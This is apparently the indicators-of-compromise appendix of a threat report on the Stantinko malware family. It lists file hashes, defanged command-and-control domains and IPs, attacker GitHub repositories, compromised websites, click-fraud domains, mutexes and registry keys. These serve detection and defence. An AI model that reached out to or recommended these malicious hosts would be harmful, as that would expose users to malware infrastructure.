D40CAC5DB9A23B372E606039DCE080BCFB9830CC\n   FE25D078DFD99091C3EF189567728BD087750FAE\n\n```\nbiosysrt.dll\n```\n   3A543E3CFE380AE404759FCCE4B3E25DE52246C9\n\n```\nbstreamsvc.dll\n```\n   1D50CF65D326545B02C3EAEF99FAEAAA5629AE94\n   C7A04F5A7A09D9674B2CA50EDAD882E050785169\n   EAE094FDA8D431CB8CDEFC9687C8B4CB1B7E2A22\n\n```\nbstreamsvc_setup.dll\n```\n   B8AA1B3DEC9B4B16B6A4BC274C093EED09E2BC4C\n\n```\nclearcache.dll\n```\n   899A71BAABFCF47F5FE31A651271D038C2619EDF\n\n```\ncreate_certificate.dll\n```\n   729B6F4D97F76DCE0F474D7D9F5E15FDD01E4998\n\n```\ncertificate.dll\n```\n   DB83BE912A25D99F501212FED8FA45672D362E67\n\n```\nd3dadapter.dll\n```\n   11354E648E41529972E6696631E035CF8BF0C537\n   1817B2B958FE7FCE0D0383B8D304BD55A6FECEB2\n   1BAF0A6E8C9DDBDFFF825686C2BA7E846FB65AEC\n   272AECA0B66ED1DEA435059481C8EE7045E44E23\n   31883581FE416A454A00B223357ECAF6E4353497\n   31E119C3D252C2AE1C18E554DCF47ED359A67AD2\n   36E11C5BFA3C05094B3FBBA39697533F63B299DB\n   52D9D26EF37A3B42A0D68E4383B73FD4D2B10018\n   56696CA2E4C85541909391E086E7D934601656D8\n   587659A8AB5617594F8064EF16CAAD082A773C7A\n   84D9F7F46810B1ADD636B07C4068517AD1B3FD07\n   8843F69F530A712568567A2D53DA01889FF9ACB9\n   957C69E52E2A3A16838051598A7B2E5BA3D54836\n   ACAF69EFC397031A7CA14E8E4B6E2D9E9DE28892\n   D2770182CE996454AA8EAFA5C96629ACCF05A06A\n   D6A59F6DD9E39EE26059C43D2E097A823770E161\n   F9DC53A63D721D0936BE8C04331E341AC2558162\n\n```\nd3dadapter dropper\n```\n   B14AF8814FE0398FFA8F5B0D76141B576E5CCE27\n   FBDBABC6C3E274B99BDFDAB79E53B29ECCF114EF\n\n```\nfdclient.dll\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n   0876F8D54F152B1ABA741004635C53A835007226\n   51196DD8D364947B17ACFA3EFCFC1AFA86CD44C3\n   886749473A29B887E8F8A79A7C3FB620D30BCB01\n   96B3A1FDFE1AA113B7791C15A57CFBBD360CC223\n   B35DA904E72868361954A27E87521EE4E0FD0AC6\n   B705F104DE0E8E43DA9AC13BA5F42DD3DA21037B\n   D06DE631AAA7A7BC1FFFA12054111BEC2A7D838D\n\n```\nFileTour related files\n```\n   06EB77205E4822A4369E9C7B43F4554248DD6FFA\n   2E9F4C6BD233799AA2AFEC9C440C737AE4114DDE\n   30139FB0B37472D02FE5ECB62F211CCFE727FD6D\n   40863793206684A021ABB1E24D524FDDF8410AB6\n   7167649EB03569C2643BCF2C2F2164EA0D803A8D\n   8E3D8606ED916152B8F70D5E38026569BB7A20C4\n   A5C3076F4E38A9E497F120558DB669FDD139E702\n   D274FD9C8AFC8FB2DAE8E81E4F6CC41592C385DF\n\n```\nghstore.exe\n```\n   E2F2532632A0ACBC6367716F82F7B62D64B896B5\n\n```\nihctrl32_setup.dll\n```\n   C9C2D2239C5371DCD6A36AE66380B615578E5B04\n\n```\nihctrl32.dll\n```\n   032B324368B3854F4EC96BE74E067D146B43F856\n   0B64F28DD56D4869ED7ECAEA81D0F7E6DCBEFA36\n   4FD7A5F602E4645EB8F21BAA127EDEB9C76CCB50\n   728718D1AD01B07FCD31C0A4FA2C975B98DB29F1\n   742EA38F09FF53626194D8B411E290B09F93EDA4\n   80C4A4FD10409742C10B4399AD7C31AFEA726A8D\n   B6CFDA9777EEF218E36A1A082C175CB6121CDB48\n   BC126956059188E2155113D2F77D5FF632B9D420\n   CB89F13D6EFBB8EBA87AB3FE3AC92A0AA738AD2D\n   D00C953FD7D6CB686036BB264D52F38C2CECEA76\n   F74ED6DFB1719924197459D7E5CFDF00568B86FB\n\n```\nir16_32.dll\n```\n   8EF4E038E14E2C853DD304DF78C3CF09176ADB65\n   962AA58834B2D071D3F8C68E893D3FDC2FEE32F3\n   9F79F982F8EEF45D5A1FC3120C5DEA2D8EC618A0\n   B85E4652910D413D19718B819736B44133FDB332\n   C269C83B3D18C01DAF9C296A198323889D339B9F\n   C9F1232DC368A828F576D6F9E8922C0DF27A33DB\n   E8D9F9A6BEC99BE13FFDF3D2F5EF74EF634EB508\n\n```\nkbdmai.dll\n```\n   0FA4A2C2F41056E071097BF9DB5312E820E3512A\n   199DA0C38EB00E495D864D95F078912EEB35639A\n   5287CE5827FFEEC6957F1F6DC769D25482479EE3\n   DA4634BD5B96519697D06D9A8F18B735302A65EA\n\n```\nkbdmai dropper\n```\n   526B86CA02CCEAF5D23C467C1D1F81DD0A36E4B9\n   E79ACFBF8D339507373B892700B27B3B795E424F\n\n```\nKBDMAI_ExtInstaller.dll\n```\n   343E52B0D30775305951252101526EAEDC8A0D01\n   D212F66683F29B5A88AFE2B6B9450DAE3DD73EB4\n\n```\nnpapihelper.dll\n```\n   1ACCD83D48F041FF362C2B8F2DCF96D6F1583168\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\noptsatadc.dll\n```\n   3B2D848030289F8F569C80193DD940FA3AE396C2\n   4D3A703DB690E975540D6D29CDAB2F75FBBCB61C\n   ADE31CC1161C06A968B68C15E4CE249AE82BC35D\n   BE756BA78F52061AE745FC3D01D97300F06F70F6\n\n```\noptsatadc_setup.dll\n```\n   326406A85486418B0DF5878B38A2436F11082411\n\n```\nremote_safe_surfing_flag\n```\n   A9C96E00C1D1B7AAEE01C30719C5068BBE196B20\n\n```\nthemctrl.dll\n```\n   03A5849E0DBE89E0727C8C37F4259623C9C131E3\n   544ED609F59C6FB2C96A566631293109172375F9\n   6004089B1678104252E02E272443A993106C912B\n   6B0FC0F7BCF63DB2778634644F5819E6247AD524\n   6DB4BE7100B317FD9CBC136DC95C4017F6D56612\n   F09352158B443FA3DB0567EF4147D94D37DBDD09\n   F3846AEF680EAA1931F75977B2ADD060D2BD3167\n\n```\nudsetup.exe\n```\n   52F44D45563944CF7735BCB6F0C448C3E9F19D04\n\n```\nudservice.exe\n```\n   0A7C1817A49E9C258DF7B3CFC416BC16A8D28C0B\n   352E05DC607AF2EE7CD3BD3FFCC546D3D29F786E\n\n```\nudservice_dropper\n```\n   0146F1042B360C8080D4D05FF523C3B80AC88069\n   EF3AFF545C48F658C021DC3E5F574AED50BE726E\n\n```\nvp9core.dll\n```\n   C897A193A13A60CC98AAAD9CB9E18AECB68797DE\n   FF9181C441AAA9108BC35B45B989B2725AD4BBF9\n\n```\nwbiosrvp.dll\n```\n   420A98F44832C11D4E56037F1F267207830BA03B\n   8750E5E2647C6A9DAB1E0AE60CC42246DA2186B2\n   F613948CE8F5358B9940EE22E9FCFC26F171637D\n\n```\nwlanmgr.dll\n```\n   10E2B8A796766A6F83278799BE16B1BF47544F2B\n   12553394AE9C099D9079DF19F0680CBE5CD780D4\n   1C8D54F0DB1136FA067F88A0AD8F0A8225854E72\n   3AF1739A03B3A70705E44049B008DF34290CE3BD\n   6141110309EF5C08DEC5746DBFB25B6302C6D887\n   6FAE5E3BB8910FCCF89208E3377C8AAD802D9BF8\n   7743BCAB7A2D77F83197F31A01C754C73BE46EAA\n\n```\nwsaudio.dll\n```\n   138ADDB8845C5F1999E2CCADB3BB7FC57D8ACCE8\n   2A9A15ED58CD54142E149DB48511B8FD4EFB1E89\n   5B54776D3C0085596ED7FF695A90B299B575DAFB\n   758FE5DF8EDAC61101AF35AA1F4440DBEC617F25\n   8BBA63FD06FC0948579A0F780EC4C0916F265D29\n   b84598b0329dde4b93fc32be2abac020f7b1e7d8\n\n```\nLinux/TrojanProxy.Stantinko.A\n```\n   C55918ADC6D2E74809777B306E361EA01A35FC05\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nwsaudio_setup.dll\n```\n   CD47C020BF420964BE329A3F2BC7FEE83BD2FACE\n\n```\nyasetup.exe\n```\n   D1F774D54BCC176AC33900085B27F62A1732B9B7\n\n```\nget_hdd.dll\n```\n   F90BBF5444F42B383B26350231DFDA002911801A\n\n```\nremove_plugins_installer.dll\n```\n   AD4E55CF03F9C24ABE2C533EE33FACD7C70A2EDA\n   C9DE95EC81BE649D796C73B5BC90CAC95C5EBBD8\n\n```\nbrutplugin.dll\n```\n   5FA986F18BDDA5C6AD4C2F2CF9608752AC797377\n\n```\nfacebook_bot.dll\n```\n   D643F426B9FAF032FF5AF7D070D2E5115B3C2E46\n\n```\nradmin.dll\n```\n   BFC7C0383CD87382575543C89E99EB41898F59EB\n\n```\nzaxar.dll\n```\n   C05D2646029DF48E262061DEF69DD8A55BF40F75\n\n```\nsearch_parser.dll\n```\n   2E726A679D32D6A29ECC7A9215409DEFA3085150\n\n```\nMalicious Browser Extensions\n```\n   The Safe Surfing\n   Teddy Protection\n\n```\nThe Safe Surfing NaCl binaries\n```\n   340622C8D335CDE73EEAA96F461440EDCB7D4C52\n   43A108A22925282D9AC02B8752EACF796B532C1E\n   49603FEC4DFA0AC5AF3300039522855920D84530\n\n###### A.2. C&C Servers\n\n```\n\nTable 11. Stantinko’s C&C servers\n\n\nFamily name Component Domain\n\n_Adstantinko_ udsetup.exe clients1.ultimate-discounter[.]com\n\n_Adstantinko_ udsetup.exe clients2.ultimate-discounter[.]com\n\n_Adstantinko_ udsetup.exe clients3.ultimate-discounter[.]com\n\nBrowser Extension APIHelper apihelper[.]org\n\nBrowser Extension The Safe Surfing safesurfing[.]me\n\nBrowser Extension Teddy Protection (Lite) teddy-protection[.]com\n\nBrowser Extension Teddy Protection (Lite) superbear[.]pro\n\nBrowser Extension Teddy Protection (Lite) teddysave[.]me\n\nBrowser Extension Teddy Protection (Lite) judgebear[.]pro\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nBrowser Extension Downloader Service ihctrl32.dll icloudsrv[.]com\n\nBrowser Extension Downloader Service ihctrl32.dll icloudsrv[.]org\n\nBrowser Extension Downloader Service ihctrl32.dll icloudsrv[.]info\n\nBrowser Extension Downloader Service ihctrl32.dll icloudsrv[.]net\n\nBrowser Extension Downloader Service themctrl.dll robothemes[.]net\n\nBrowser Extension Downloader Service themctrl.dll tmrobo[.]com\n\nBrowser Extension Downloader Service themctrl.dll tmrobo[.]org\n\nBrowser Extension Downloader Service opsatadc.dll hdr-group[.]org\n\nBrowser Extension Downloader Service opsatadc.dll hdr-group[.]info\n\nBrowser Extension Downloader Service opsatadc.dll hdr-group[.]net\n\nLinux Trojan Proxy / 185.28.22[.]22:81\n\nLinux Trojan Proxy / 195.226.218.[.]234:80\n\nOld Browser Extension\nir16_32.dll wsslupdate[.]org\nDownloader Service\n\nOld Plugin Downloader Service d3dadapter.dll d3dupdate[.]com\n\nOld Plugin Downloader Service d3dadapter.dll mserrep[.]org\n\nOld Plugin Downloader Service KBDMAI.dll kbdmai[.]net\n\nOld Plugin Downloader Service KBDMAI.dll wupdateservice[.]us\n\nOld Plugin Downloader Service wlanmgr.dll wadgeotrust[.]com\n\nPlugin Downloader Service wsaudio.dll wsaudio[.]com\n\nPlugin Downloader Service wsaudio.dll wsaudio[.]net\n\nPlugin Downloader Service wsaudio.dll wsaudio[.]org\n\nPlugin Downloader Service bstreamsvc.dll vp9codec[.]com\n\nPlugin Downloader Service bstreamsvc.dll vp9codec[.]net\n\nPlugin Downloader Service wbiosrvp.dll biosysltd[.]com\n\nPlugin Downloader Service wbiosrvp.dll biosysltd[.]org\n\nPDS Plugin get_hdd.dll 185.28.22[.]22\n\nhxxp://raw.githubusercontent.com/\nPDS Plugin search_parser.dll\nbrenev/collection/master/index\n\nPDS Plugin brut_plugin.dll 185.28.22[.]22\n\nPDS Plugin facebook_bot.dll 185.28.22[.]22\n\nPDS Plugin radmin.dll 93.188.161[.]17:8000\n\nStantinko Installer udservice.exe update.ultimate-discounter[.]com\n\nStantinko Installer udservice.exe udiscount[.]net\n\nStantinko Installer udservice.exe ultimate-discounter[.]org\n\nStantinko Installer udservice.exe upd-discounter[.]com\n\nStantinko Installer udservice.exe udiscounter[.]org\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nStantinko Installer udservice.exe wannaupdate[.]com\n\nStantinko Installer ghstore.exe ghosterystore[.]com\n\nStantinko Installer bhctrl32.exe nvccupdate[.]com\n\nStantinko Installer redisd.exe rdsbase[.]com\n\nStantinko github repositories\n```\n   hxxps://www.github.com/brenev/collection\n   hxxps://www.github.com/svetlanachudinovskih/core\n   hxxps://www.github.com/alexandra-ivanyan/png\n   hxxps://www.github.com/romochka-shevchenko-2015/rebranding\n   hxxps://www.github.com/elina-golubeva/style\n   hxxps://www.github.com/kurenkov2014/attachments\n   hxxps://www.github.com/lenusyashparteeva/losed_data\n   hxxps://www.github.com/varvarakayusova/images\n   hxxps://www.github.com/anatoly-mescheryakov/icons\n   hxxps://www.github.com/vlabygina/clipart\n   hxxps://www.github.com/grishenka-kobzar/promo\n   hxxps://www.github.com/kabanovmihail/static\n   hxxps://www.github.com/shapovalovnikolayy/static\n   hxxps://www.github.com/SaintJson/core\n   hxxps://www.github.com/umnoffvladislaw/core\n\n```\nList of compromised websites with their date of first appearance (Search parser C&C)\n```\n   Jan 21 2014 | hxxp://www.corsionlinemtpromozione.it/images/banners/b1/index.php\n   Jan 21 2014 | hxxp://xn--elprincipenorteo-lub.com.ar/images/banners/b1/index.php\n   Jan 21 2014 | hxxp://www.ucguabira.com/images/banners/b1/index.php\n   Jan 21 2014 | hxxp://www.unioncasa.org/images/banners/b1/index.php\n   Jan 21 2014 | hxxp://localhost/searchparser/index.php\n   Jan 21 2014 | hxxp://www.unique7000.org/en/images/banners/b1/index.php\n   Feb 19 2014 | hxxp://www.sfcu.com.au/sfcu/images/banners/b1/index.php\n   Feb 19 2014 | hxxp://eventsbyexcellence.com/photography/images/banners/b1/index.php\n   Feb 19 2014 | hxxp://grupoportusalud.net/images/banners/b1/index.php\n   Feb 19 2014 | hxxp://missionlocalenyonspierrelatte.com/images/banners/b1/index.php\n   Feb 19 2014 | hxxp://talsma-co.nl/images/banners/b1/index.php\n   Nov 5 2014 | hxxp://scorzapesquisa.net/site/images/banners/b1/index.php\n   Nov 5 2014 | hxxp://fotopercepcja.pl/images/banners/b1/index.php\n   Apr 16 2015 | hxxp://cdvet.ch/images/banners/b1/index.php\n   Apr 16 2015 | hxxp://www.menicon.fr/porteurs/images/banners/b1/index.php\n   Apr 16 2015 | hxxp://topperclean.nl/images/banners/b1/index.php\n   Apr 16 2015 | hxxp://iguabaonline.com.br/quasar/images/banners/b1/index.php\n   Apr 17 2015 | hxxp://hlcl.org/joomla15/images/banners/b1/index.php\n   Apr 27 2015 | hxxp://www.corsionlinemtpromozione.it/frigocontact/images/banners/\n             b1/index.php\n   Apr 27 2015 | hxxp://lucerne.websitewelcome.com/~trinityc/images/banners/b1/index.php\n   Apr 27 2015 | hxxp://portal.antreprenor.upb.ro/images/banners/b1/index.php\n   Apr 27 2015 | hxxp://gruppo89.org/images/banners/b1/index.php\n   Apr 27 2015 | hxxp://79.170.44.132/nn-projects.co.uk/images/banners/b1/index.php\n   Apr 27 2015 | hxxp://veterinariostijuana.com/images/banners/b1/index.php\n   May 30 2015 | hxxp://xado1.md/images/banners/b1/index.php\n   Jun 10 2015 | hxxp://z272081.infobox.ru/images/banners/b1/index.php\n   Jun 10 2015 | hxxp://oyqrznx.wwwhl.ru/2014/images/banners/b1/index.php\n   Jun 23 2015 | hxxp://bernadettejansen.nl/site/images/banners/b1/index.php\n   Jun 23 2015 | hxxp://srpskicetnickipokret.org/scp/images/banners/b1/index.php\n   Jun 23 2015 | hxxp://blau-weiss-grenzenlos.de/images/banners/b1/index.php\n   Aug 5 2015 | hxxp://liceosilvestri.it/cms/images/banners/b1/index.php\n   Aug 10 2015 | hxxp://esportesnovasoure.com.br/images/banners/b1/index.php\n   Aug 10 2015 | hxxp://hotel-idol.com/tr/images/banners/b1/index.php\n   Aug 24 2015 | hxxp://wiewiese.bauernhof-urlaub.or.at/images/banners/b1/index.php\n   Aug 24 2015 | hxxp://www.swrs-weinsberg.de/images/banners/b1/index.php\n   Aug 27 2015 | hxxp://hohnstorf-basketball.de/alt/images/banners/b1/index.php\n   Nov 26 2015 | hxxp://www.ismailagenturen.com/images/banners/b1/index.php\n   Nov 26 2015 | hxxp://judoclub2haine.be/images/banners/b1/index.php\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nNov 26 2015 | hxxp://moradiaecidadania.org.br/images/banners/b1/index.php\nNov 26 2015 | hxxp://romsee-stavelot-romsee.be/images/banners/b1/index.php\nNov 26 2015 | hxxp://parafia-srokowo.pl/images/banners/b1/index.php\nDec 4 2015 | hxxp://soymocano54.com/images/banners/b1/index.php\nDec 4 2015 | hxxp://sleepatastridlindgrensworld.se/images/banners/b1/index.php\nDec 4 2015 | hxxp://antalyainsaatdergisi.com/images/banners/b1/index.php\nDec 4 2015 | hxxp://www2.karate-st-georgen.at/images/banners/b1/index.php\nFeb 23 2016 | hxxp://ns2.huespedvirtualserver.com/images/banners/b1/index.php\nFeb 24 2016 | hxxp://www.uvdr-vg.hr/images/banners/b1/index.php\nFeb 24 2016 | hxxp://jason.shigadigsample.com/images/banners/b1/index.php\nFeb 24 2016 | hxxp://informatikundgesellschaft.de/joomla/images/banners/b1/index.php\nApr 20 2016 | hxxp://scuolasanfrancescodassisi.net/images/banners/b1/index.php\nApr 20 2016 | hxxp://gesund-bewegen.ch/cms/images/banners/b1/index.php\nApr 20 2016 | hxxp://quali-kleen.com/taste/images/banners/b1/index.php\nApr 20 2016 | hxxp://kevin-drieschner.de/feuerwehr_cms/images/banners/b1/index.php\nApr 20 2016 | hxxp://sv-limbach.de/images/banners/b1/index.php\nApr 20 2016 | hxxp://wittmund-restaurant-residenz.de/images/banners/b1/index.php\nApr 20 2016 | hxxp://old.novedvory.eu/dokumenty/banners/b1/index.php\nApr 20 2016 | hxxp://www.parkbetreuung-margareten.at/cms/images/banners/b1/index.php\nApr 20 2016 | hxxp://www.lambertrentals.com/portal/images/banners/b1/index.php\nApr 20 2016 | hxxp://www.goldundpartner.at/images/banners/b1/index.php\nApr 20 2016 | hxxp://egypttoursgate.com/family-holidays-luxury-vacations/images/\n          banners/b1/index.php\nApr 20 2016 | hxxp://pepijnenvalerie.nl/joomla/images/banners/b1/index.php\nApr 20 2016 | hxxp://kmz-buchen.de/joomla/images/banners/b1/index.php\nMay 25 2016 | hxxp://mobilhome.montourey.free.fr/images/banners/b1/index.php\nJun 23 2016 | hxxp://sailbajaadventures.com/images/banners/b1/index.php\nJun 23 2016 | hxxp://weddingsbeautiful.com.mx/weddings/images/banners/b1/index.php\nJul 1 2016 | hxxp://s17drohobych.freehostia.com/images/banners/b1/index.php\nJul 1 2016 | hxxp://zharyk.com.kz/rus/images/banners/b1/index.php\nJul 4 2016 | hxxp://otmetka5ballov.ru/images/banners/b1/index.php\nJul 18 2016 | hxxp://parafia-srokowo.pcspace.pl/images/banners/b1/index.php\nJul 18 2016 | hxxp://www.florestal.gov.br/pngf/images/banners/b1/index.php\nJul 18 2016 | hxxp://multfestas.com.br/2013/images/banners/b1/index.php\nJul 31 2016 | hxxp://asti.bplaced.net/images/banners/b1/index.php\nAug 4 2016 | hxxp://yorkshire-chimneys.co.uk/images/banners/b1/index.php\nAug 4 2016 | hxxp://regionarequipa.gob.pe/dependencias/grcet/images/banners/b1/\n          index.php\nAug 4 2016 | hxxp://pescarafclive.altervista.org/images/banners/b1/index.php\nAug 4 2016 | hxxp://www.powisstreetdentalpractice.com/images/banners/b1/index.php\nAug 4 2016 | hxxp://mytrade-agriculture.com/images/banners/b1/index.php\nAug 4 2016 | hxxp://alexincerti.xoom.it/images/banners/b1/index.php\nAug 9 2016 | hxxp://zarin-daneh.com/images/banners/b1/index.php\nAug 23 2016 | hxxp://explora.ulagos.cl/cienciaviva/images/banners/b1/index.php\nAug 26 2016 | hxxp://d2062745.instant.xoom.it/siteapps/66587/htdocs/images/banners/\n          b1/index.php\nAug 26 2016 | hxxp://waldwichtel-haemelerwald.de/images/banners/b1/index.php\nSep 2 2016 | hxxp://royerodistrilab.com/nelsonroyero/images/banners/b1/index.php\nSep 12 2016 | hxxp://152.74.9.14/UNITEP/images/banners/b1/index.php\nSep 12 2016 | hxxp://vinculacion.coparmexcoahuila.org.mx/images/banners/b1/index.php\nSep 12 2016 | hxxp://kreds19-frederikshavn.dk/images/banners/b1/index.php\nSep 12 2016 | hxxp://mult.chandra.ac.th/cw/ge/images/banners/b1/index.php\nSep 13 2016 | hxxp://m2mobili.com/images/banners/b1/index.php\nSep 13 2016 | hxxp://rha93.free.fr/images/banners/b1/index.php\nSep 16 2016 | hxxp://l2campus.com/images/banners/b1/index.php\nOct 5 2016 | hxxp://codigosurbanos.com/v4/images/banners/b1/index.php\nOct 6 2016 | hxxp://codigosurbanos.com/v4/images/banners/b1/index_n.php\nOct 6 2016 | hxxp://feuerwehr-hartenstein.de/images/banners/b1/index.php\nOct 7 2016 | hxxp://st-johannesstift.de/images/banners/b1/index.php\nOct 7 2016 | hxxp://scrisoaredelamosul.ro/santa/images/banners/b1/index.php\nOct 7 2016 | hxxp://oneshote.com/Site/joomla/images/banners/b1/index.php\nOct 13 2016 | hxxp://conceptosgrupocreativo.com/visionamosSalud/images/banners/\n          b1/index.php\nOct 14 2016 | hxxp://www.tangosex.it/images/banners/b1/index.php\nOct 17 2016 | hxxp://smksoretulungagung.sch.id/images/banners/b1/index.php\nOct 19 2016 | hxxp://shapinglivesconference.com/images/banners/b1/index.php\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nOct 19 2016 | hxxp://vn-net29.homedns.org/fewo-primbs/images/banners/b1/index.php\nOct 20 2016 | hxxp://hinanumbufoundationgh.org/images/banners/b1/index.php\nOct 20 2016 | hxxp://dorazio.altervista.org/images/banners/b1/index.php\nOct 20 2016 | hxxp://k3bweb78.altervista.org/images/banners/b1/index.php\nOct 20 2016 | hxxp://pepekswiata.com.pl/starealejare/images/banners/b1/index.php\nOct 20 2016 | hxxp://www.chantalligraphics.com/health101.old/images/banners/\n          b1/index.php\nOct 20 2016 | hxxp://banchio.com/pendientes/images/banners/b1/index.php\nOct 20 2016 | hxxp://southswimming.com/content/images/banners/b1/index.php\nOct 20 2016 | hxxp://edomerlomat.altervista.org/images/banners/b1/index.php\nOct 24 2016 | hxxp://roanokecares.com/images/banners/b1/index.php\nOct 24 2016 | hxxp://cadexchuquisaca.org.bo/images/banners/b1/index.php\nOct 25 2016 | hxxp://laboratoriochimicoveneto.it/lcv/images/banners/b1/index.php\nOct 25 2016 | hxxp://142-4-18-114.unifiedlayer.com/images/banners/b1/index.php\nOct 25 2016 | hxxp://bobonana.com/familien/images/banners/b1/index.php\nOct 26 2016 | hxxp://panaderiasantalibrada.com/main/images/banners/b1/index.php\nOct 26 2016 | hxxp://notre370z.com/images/banners/b1/index.php\nOct 26 2016 | hxxp://barangayugong.com/images/banners/b1/index.php\nNov 3 2016 | hxxp://alkiviadistours.gr/tour/images/banners/b1/index.php\nNov 8 2016 | hxxp://syl-diavitikon-nthess.gr/images/banners/b1/index.php\nNov 8 2016 | hxxp://lksavvas.gr/images/banners/b1/index.php\nNov 9 2016 | hxxp://tagaras.gr/images/banners/b1/index.php\nNov 9 2016 | hxxp://debian.itbiz.gr/enoria_kastaneris/images/banners/b1/index.php\nNov 9 2016 | hxxp://energymix.xp3.biz/joomla/images/banners/b1/index.php\nNov 10 2016 | hxxp://archiv.nezavisli-zruc.cz/images/banners/b1/index.php\nDec 1 2016 | hxxp://kapatex.iluze.com/images/banners/b1/index.php\nDec 15 2016 | hxxp://derecskeikutyaiskola.hu/images/banners/b1/index.php\nDec 15 2016 | hxxp://alhwaidi4hybrid.com/ar/images/banners/b1/index.php\nDec 15 2016 | hxxp://mst.etravelsystem.com/eztproperty/images/banners/b1/index.php\nDec 15 2016 | hxxp://alzwea.com/itech-iraq.com/images/banners/b1/index.php\nDec 20 2016 | hxxp://zawodnicy.baseball.pl/images/banners/b1/index.php\nDec 21 2016 | hxxp://intranet2.marne.chambagri.fr/joomla/images/banners/b1/index.php\nDec 21 2016 | hxxp://www.daydream-lab.com/flsh/main/images/banners/b1/index.php\nDec 21 2016 | hxxp://rouken.sakura.ne.jp/fittest/images/mod.php\nDec 21 2016 | hxxp://rouken.sakura.ne.jp/fittest/images/banners/b1/index.php\nDec 21 2016 | hxxp://asandoosh.com/images/banners/b1/index.php\nDec 21 2016 | hxxp://smabugisiah.edu.my/images/banners/b1/index.php\nDec 26 2016 | hxxp://alhayat-aljadedah.com/images/banners/b1/index.php\nDec 26 2016 | hxxp://leadershipacademy.ps/english/images/banners/b1/index.php\nDec 26 2016 | hxxp://www.agencija-jajce.ba/arabic/images/banners/b1/index.php\nDec 26 2016 | hxxp://vanocnidarky.provsechny.net/images/banners/b1/index.php\nDec 26 2016 | hxxp://millerjw.com/czechpoint/images/banners/b1/index.php\nDec 26 2016 | hxxp://edomerlomat.altervista.org/images/banners/b1/index.php\nDec 26 2016 | hxxp://krystiank.home.pl/autoinstalator/joomla15/images/banners/\n          b1/index.php\nDec 27 2016 | hxxp://tommasobocchetti.it/images/banners/b1/index.php\nJan 30 2017 | hxxp://vmedia.mk/GinekomedikaCalculators/images/banners/b1/index.php\nJan 30 2017 | hxxp://xn----7sbpbmda7aknrei7dwb9f.xn--p1ai/images/banners/b1/index.php\nJan 30 2017 | hxxp://vehicleteams.scripts.mit.edu/home/images/banners/b1/index.php\nJan 30 2017 | hxxp://dvz.ppi.net.ua/images/banners/b1/index.php\nJan 31 2017 | hxxp://irina-petrenko.by/images/banners/b1/index.php\nJan 31 2017 | hxxp://usreturns.com/images/banners/b1/index.php\nJan 31 2017 | hxxp://wolnywww.instytutslowacki.pl/images/banners/b1/index.php\nJan 31 2017 | hxxp://www.kalamari-notes.gr/joomla/images/banners/b1/index.php\nJan 31 2017 | hxxp://bukaeva.lg.ua/images/banners/b1/index.php\nJan 31 2017 | hxxp://xier.avalon.biz.ua/images/banners/b1/index.php\nFeb 15 2017 | hxxp://xray.bmc.uu.se/spb/images/banners/b1/index.php\nFeb 15 2017 | hxxp://aupair-germany.eu/inhalt/images/banners/b1/index.php\nFeb 15 2017 | hxxp://vicaweb.talentoshow.com/Joomla/images/banners/b1/index.php\nFeb 16 2017 | hxxp://yik.edu.my/sekolah/mspp/images/banners/b1/index.php\nFeb 16 2017 | hxxp://treningmentalny.home.pl/m_dddd/images/banners/b1/index.php\nMar 16 2017 | hxxp://the-dreamweaver.net/portal/images/banners/b1/index.php\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n   Mar 16 2017 | hxxp://eki.szie.hu/erasmusip/images/banners/b1/index.php\n   Mar 16 2017 | hxxp://erasmus.sp9.slupsk.pl/images/banners/b1/index.php\n   Apr 3 2017 | hxxp://sceptretoursandtravel.com/images/banners/b1/index.php\n   Apr 25 2017 | hxxp://alcaldiadematurin.gob.ve/portal3/images/banners/b1/index.php\n   Apr 25 2017 | hxxp://thegamerszone-mgc.com/images/banners/b1/index.php\n   May 8 2017 | hxxp://banueventsolutions.com/images/banners/b1/index.php\n   May 23 2017 | hxxp://kryonschule-ahaus.de/images/banners/b1/index.php\n   May 23 2017 | hxxp://aklcosmetics.com.au/images/banners/b1/index.php\n   May 24 2017 | hxxp://lotto4phone.altervista.org/images/banners/b1/index.php\n   May 25 2017 | hxxp://tim-johnson.com/images/banners/b1/index.php\n   May 25 2017 | hxxp://scrapbook-stickers.com/images/banners/b1/index.php\n   May 26 2017 | hxxp://doscerodesign.com/hele/images/banners/b1/index.php\n\n```\nFileTour click-fraud doorway websites\n```\n   hxxp://good-journal.net\n   hxxp://nano-news.info\n   hxxp://newssocial.org\n   hxxp://news-true.net\n\n```\nFileTour click-fraud bitly redirections\n```\n   hxxps://bitly.com/2mfUhWn2\n   hxxps://bitly.com/2lzYhUo\n\n###### A.3. Windows Artifacts\n\n```\nMutexes\n```\n   Global\\BitStreamSvc\n   Global\\D3DAdapter_ServiceEvent\n   Global\\Intel_hctrl32\n   Global\\KBDMAIServiceEvent\n   Global\\Kbdmai_ServiceEvent\n   Global\\OptimizeSataDevices\n   Global\\ServiceLibEvent\n   Global\\ThemeControl\n   Global\\WBiosrvp\n   Global\\Wlan_Manager_Initialize\n   Global\\Wsaudio_Initialize\n\n```\nWindows Registry keys\n```\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\BitStreamSvc\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\Bonjoiur Host Controller\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\Coupons Browser Update Service\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\d3dadapter\\\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\Ghostery Storage Server\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\ihctrl32\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\ir16_32\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\KBDMAI\\\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\optsatadc\\\n   HKLM\\SYSTEM\\CurrentControlSet\\services\\themctrl\\\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\wbiosrvp\\\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\wlanmgr\\\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\wsaudio\\\n   